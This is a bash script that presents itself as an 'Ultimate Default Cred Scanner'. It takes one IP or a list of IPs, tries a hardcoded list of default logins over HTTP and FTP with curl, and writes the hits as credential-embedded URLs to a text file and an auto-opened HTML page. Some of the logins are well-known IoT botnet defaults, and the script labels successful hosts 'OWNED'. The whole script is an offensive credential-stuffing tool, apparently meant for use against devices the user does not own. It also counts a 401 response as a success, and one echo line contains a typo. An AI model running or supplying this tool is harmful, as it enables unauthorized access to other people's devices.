#!/bin/bash

# clt.sh - FINAL + _lt.txt output as you wanted
# ./clt.sh 205.215.255.11
# ./clt.sh -i mylist.txt   → creates mylist_lt.txt

BOOKMARK="WORKING_DEVICES_CLICK_HERE.html"
CREDS=(
  "admin:admin" "heartbeat:" "admin:" "admin:1234" "admin:password" "admin:12345"
  "root:" "root:vizxv" "root:xc3511" "root:juantech" "root:666666"
  "root:7ujMko0admin" "root:hi3518" "root:admin" "root:12345" "root:root"
  "ftp:ftp" "guest:guest" "anonymous:anonymous" ":" "test:test"
)

# === Create clickable HTML ===
cat > "$BOOKMARK" <<'EOF'
<!DOCTYPE html>
<html><head><title>★ WORKING DEVICES - CLICK TO OPEN ★</title>
<style>
  body {font-family: Arial; background: #000; color: #0f0; padding: 30px; line-height: 2;}
  a {color: #0f0; font-size: 19px; text-decoration: underline;}
  h1 {text-align: center; font-size: 28px;}
</style></head><body>
<h1>✔ SUCCESSFUL LOGINS - CLICK TO OPEN</h1><hr>
EOF

# === Parse args ===
INPUT_FILE=""
SINGLE_IP=""

if [[ $# -eq 0 ]]; then
  echo "Usage: $0 <IP>    or    $0 -i file.txt"
  exit 1
fi

while [[ $# -gt 0 ]]; do
  case "$1" in
    -i)
      INPUT_FILE="$2"
      shift 2
      ;;
    -*)
      echo "Unknown option: $1"; exit 1
      ;;
    *)
      [[ -n "$SINGLE_IP" ]] && { echo "Only one IP allowed"; exit 1; }
      SINGLE_IP="$1"
      shift
      ;;
  esac
done

# === Set output TXT file exactly as you want ===
if [[ -n "$INPUT_FILE" ]]; then
  if [[ "$INPUT_FILE" =~ \.txt$ ]]; then
    RESULT_TXT="${INPUT_FILE%.txt}_lt.txt"
  else
    RESULT_TXT="${INPUT_FILE}_lt.txt"
  fi
else
  RESULT_TXT="single_ip_lt.txt"
fi

> "$RESULT_TXT"

clear
echo "========================================================"
echo "       Ultimate Default Cred Scanner"
echo "       TXT results → $RESULT_TXT"
echo "       Clickable HTML → $ lunaticBOOKMARK"
echo "========================================================"
echo

test_ip() {
  local ip="$1"
  local found=0
  echo "Scanning $ip ..."

  for cred in "${CREDS[@]}"; do
    user=$(cut -d: -f1 <<< "$cred")
    pass=$(cut -d: -f2- <<< "$cred")

    for proto in http ftp; do
      url="$proto://$user:${pass}@$ip"
      code=$(curl -s -o /dev/null -w "%{http_code}" \
               --connect-timeout 3 --max-time 10 \
               -u "$user:$pass" "$proto://$ip/" 2>/dev/null || echo "000")

      if [[ "$code" =~ ^(200|226|301|302|401)$ ]]; then
        echo "   ✔ $url  (code $code)"
        echo "$url" >> "$RESULT_TXT"                    # clean URL in _lt.txt
        echo "<a href='$url' target='_blank'>$url → OPEN (code $code)</a><br>" >> "$BOOKMARK"
        ((found++))
      fi
    done
  done

  (( found > 0 )) && echo "   >>> $ip OWNED ($found hits) → saved to $RESULT_TXT" \
                  || echo "   [-] Nothing on $ip"
  echo
}

# === Main ===
if [[ -n "$INPUT_FILE" ]]; then
  [[ ! -f "$INPUT_FILE" ]] && { echo "File not found: $INPUT_FILE"; exit 1; }
  echo "Loading from $INPUT_FILE → results in $RESULT_TXT"
  echo
  while IFS= read -r line || [[ -n "$line" ]]; do
    line=$(echo "$line" | xargs)
    [[ -z "$line" || "$line" =~ ^(#|;) ]] && continue
    [[ "$line" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
    test_ip "$line"
  done < "$INPUT_FILE"
else
  test_ip "$SINGLE_IP"
fi

# === Finalize HTML ===
echo "<hr><p>Done • $(wc -l < "$RESULT_TXT" 2>/dev/null || echo 0) working links saved</p></body></html>" >> "$BOOKMARK"

echo "========================================================"
echo "   ALL FINISHED!"
echo "   Main results → $RESULT_TXT"
echo "   Bonus clickable → $BOOKMARK (double-click)"
echo "========================================================"

# Auto-open HTML
[[ "$(uname)" == "Darwin" ]] && open "$BOOKMARK" 2>/dev/null
[[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]] && xdg-open "$BOOKMARK" 2>/dev/null &